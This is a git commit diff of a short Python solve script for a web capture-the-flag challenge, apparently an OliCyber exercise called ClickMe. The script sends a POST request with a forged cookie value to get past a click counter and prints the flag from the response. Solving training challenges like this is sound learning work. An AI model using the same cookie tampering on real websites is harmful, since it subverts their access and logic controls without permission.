96a983a999e1fc56925bb57fd442c93e3eab2ba2
lore6e7a6f <142683062+lore6e7a6f@users.noreply.github.com>
2025-10-27 20:40:45 +0100

    Implement GET and POST requests to retrieve flag
    Added functionality to send a GET request and extract the flag from the response.

--- solves/web/ClickMe.py
+++ solves/web/ClickMe.py
@@ -1,4 +1,14 @@
-# n_click salvato nei cookie
-# --> edit cookie value con '10000000' 
-# --> show requests with this cookie
-# .html contiene la flag
+import requests
+
+url = 'http://click-me.challs.olicyber.it'
+payload = {'cookies':'10000000'}
+
+"""
+r=requests.get(url)
+print(r.text)
+"""
+r=requests.post(url, cookies=payload).text
+
+for i in r.split():
+    if "flag{" in i.lower():
+        print(i)
